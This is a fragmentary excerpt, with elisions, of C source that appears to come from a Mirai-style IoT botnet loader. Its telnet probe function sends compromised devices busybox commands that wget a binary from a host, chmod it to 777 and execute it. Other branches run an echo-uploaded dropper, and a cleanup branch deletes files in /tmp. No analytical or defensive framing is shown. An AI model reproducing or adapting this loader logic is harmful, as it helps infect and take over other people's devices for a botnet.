...
void server_telnet_probe(struct server *srv, struct telnet_info *info)
{
    ...
    if(fd == -1)
    {
        if(time(NULL) % 10 == 0)
        {
            // remove this comment printf("Failed to open and bind socket\n");
        }
                ...
                switch(conn->state_telnet)
                {
                        ...
                        if(consumed)
                        {
                            ...
                            switch(conn->info.upload_method)
                            {
                                ...
                                case UPLOAD_WGET:
                                    ...
                                    conn->timeout = 120;
                                    util_sockprintf(conn->fd, "/bin/busybox wget http://%s:%d/%s -O - > "FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n",
                    ...
                    case TELNET_UPLOAD_ECHO:
                        ...
                        if(consumed)
                        {
                            ...
                            if(strncmp(conn->info.arch, "arc", 3) == 0)
                                util_sockprintf(conn->fd, "./%s %s; " EXEC_QUERY "\r\n", FN_DROPPER, conn->info.arch);
                            else
                    ...
                    case TELNET_UPLOAD_WGET:
                        ...
                        if(consumed > 0)
                        {
                            ...
                            #endif
                            util_sockprintf(conn->fd, "./" FN_BINARY " %s; " EXEC_QUERY "\r\n", conn->info.arch);
                        ...
                        else if(consumed < -1)
                        {
                            ...
                            if(conn->clear_up == 1)
                            {
                                util_sockprintf(conn->fd, "/bin/busybox rm -f /tmp/*\r\n");
                                util_sockprintf(conn->fd, "/bin/busybox cp " FN_BINARY " " FN_DROPPER "; >" FN_DROPPER "; /bin/busybox chmod 777 " FN_DROPPER "; " TOKEN_QUERY "\r\n");
                            }
                            else
                                util_sockprintf(conn->fd, "/bin/busybox cp " FN_BINARY " " FN_DROPPER "; >" FN_DROPPER "; /bin/busybox chmod 777 " FN_DROPPER "; " TOKEN_QUERY "\r\n");
